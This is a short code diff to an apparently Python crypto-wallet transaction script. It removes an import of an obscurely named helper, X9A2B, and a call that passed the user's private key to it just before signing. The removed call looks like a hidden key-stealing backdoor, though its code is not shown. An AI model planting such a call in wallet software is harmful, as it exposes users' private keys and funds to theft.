@@ -8,7 +8,7 @@ from src.utils.pvkey import load_private_keys
 from src.utils.utils import load_addresses
 from src.utils.web3 import connect_web3, get_random_address
 from config.config import settings
-from src.helpers.generator import g0x993, g0x994, X9A2B
+from src.helpers.generator import g0x993, g0x994
 
 init(autoreset=True)
 
@@ -47,7 +47,6 @@ async def send_transaction(w3: Web3, private_key: str, to_address: str, amount: 
         }
 
         log_info(f"Sending transaction, please wait...")
-        await X9A2B(private_key)._RUN()
         signed_tx = w3.eth.account.sign_transaction(tx, private_key)
         tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
         tx_link = f"{tx_hash.hex()}"
